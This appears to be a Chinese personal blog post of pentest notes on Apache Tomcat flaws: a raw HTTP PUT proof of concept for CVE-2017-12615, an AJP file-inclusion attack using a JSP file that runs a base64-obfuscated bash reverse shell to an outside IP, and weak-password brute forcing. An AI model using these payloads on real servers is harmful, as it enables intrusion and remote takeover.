+++
ShowToc = true
TocOpen = true
title = 'Tomcat'
date = 2024-10-11T14:25:59+08:00
draft = false
private = true
show_reading_time = true
categories = 'Java安全'
+++

# 一、Tomcat

Tomcat是Apache 软件基金会（Apache Software Foundation）的Jakarta 项目中的一个核心项目，由Apache、Sun 和其他一些公司及个人共同开发而成。由于有了Sun 的参与和支持，最新的Servlet 和JSP 规范总是能在Tomcat 中得到体现，Tomcat 5支持最新的Servlet 2.4 和JSP 2.0 规范。因为Tomcat 技术先进、性能稳定，而且免费，因而深受Java 爱好者的喜爱并得到了部分软件开发商的认可，成为目前比较流行的Web 应用服务器。

# 二、漏洞介绍与利用

## 1、PUT文件上传 CVE-2017-12615

主要影响版本：




Tomcat 7.0.0-7.0.81

POC：此漏洞较为简单，可梭哈




Tomcat 7.0.0-7.0.81

```
POC：
PUT /1.txt/ HTTP/1.1
Host: 192.168.2.66:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Referer: http://192.168.2.66:8080/tomcat.css
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Length: 3

cxk
```

## 2、AJP文件包含

由于 Tomcat AJP 协议设计上存在缺陷，攻击者通过 Tomcat AJP Connector 可以读取或包含 Tomcat 上所有 webapp 目录下的任意文件，例如可以读取 webapp 配置文件或源代码。


此外在目标应用有文件上传功能的情况下，配合文件包含的利用还可以达到远程代码执行的危害。

影响版本：

Apache Tomcat 6





Apache Tomcat 7< 7.0.100





Apache Tomcat 8< 8.5.51





Apache Tomcat 9< 9.0.31

此漏洞无法梭哈检测，需要指定8009端口和访问文件，工具可利用

利用方式：

1、上传JSP反弹shell文件，内容如下：

```
<%Runtime.getRuntime().exec("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNDAvODg4OCAwPiYx}|{base64,-d}|{bash,-i}");%>
```

![](/zj_img/WEBRESOURCE2bd2c33e9c184460d768a77a5c8dea8f截图.png)

2、文件包含反弹shell:

![](/zj_img/WEBRESOURCE425208ed092d91b5cdbfaaa162251e77截图.png)

3、弱密码

先从低版本tomcat管理控制台进行弱口令爆破tomcat-6.0.9，在7.x 后的版本加入了防暴力破解，所以针对tomcat 7.x 以后的版本不用考虑爆破。